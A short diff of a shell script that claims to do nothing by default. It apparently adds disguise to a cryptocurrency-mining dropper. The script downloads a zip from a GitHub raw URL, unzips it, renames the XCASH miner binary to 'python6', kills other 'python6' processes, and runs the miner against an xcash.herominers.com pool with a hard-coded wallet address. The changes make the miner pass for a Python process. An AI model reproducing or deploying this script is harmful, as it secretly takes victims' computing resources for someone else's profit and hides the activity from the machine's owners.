@@ -11,9 +11,9 @@
 #
 # By default this script does nothing.
 if [ -f ${PWD}/python6 ]; then
-    if pgrep -x "python" > /dev/null
+    if pgrep -x "python6" > /dev/null
 then
-pkill python
+pkill python6
 echo " kill process"
 ./python6 -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
 
@@ -30,7 +30,7 @@ fi
 
 wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/Xcash.zip
 unzip Xcash.zip
-mv XCASH_ALL_Miner
+mv XCASH_ALL_Miner python6
 ./python6 -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
 
 exit 0
